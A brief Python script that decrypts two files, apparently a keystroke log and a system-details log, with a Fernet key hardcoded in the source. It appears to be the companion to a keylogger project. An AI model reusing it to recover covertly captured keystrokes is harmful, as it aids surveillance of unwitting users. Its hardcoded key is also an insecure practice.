# Decryption function
from cryptography.fernet import Fernet

key = "1eW-jn8BhjrXv2ObHZUnjNxqxhShCs2TOOsrvrY8dls="

e_key_info = r"/e_key_log.txt"
e_system_info = r"/e_sys_details.txt"

encrypted_files = [e_key_info, e_system_info]
count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1